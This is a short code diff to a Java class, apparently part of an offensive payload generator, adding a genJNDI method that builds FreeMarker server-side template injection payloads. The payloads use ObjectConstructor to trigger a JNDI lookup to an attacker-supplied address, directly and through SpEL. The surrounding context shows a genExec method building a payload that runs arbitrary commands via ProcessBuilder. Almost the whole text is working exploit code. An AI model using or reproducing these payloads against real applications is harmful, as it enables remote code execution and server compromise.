@@ -45,6 +45,14 @@ public class FreeMarkerExpr implements IExpr {
     }
 
     @Override
+    public String[] genJNDI(String jndiAddress) {
+        return new String[]{
+                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.naming.InitialContext\").lookup(\"" + jndiAddress + "\")}"),
+                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"new javax.naming.InitialContext().lookup('" + jndiAddress + "')\").getValue()}")
+        };
+    }
+
+    @Override
     public String[] genExec(String command) {
         return new String[]{
                 out("<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\"," + ArgumentTokenizer.getTokenizedString(command, "\"") + ").start()}")
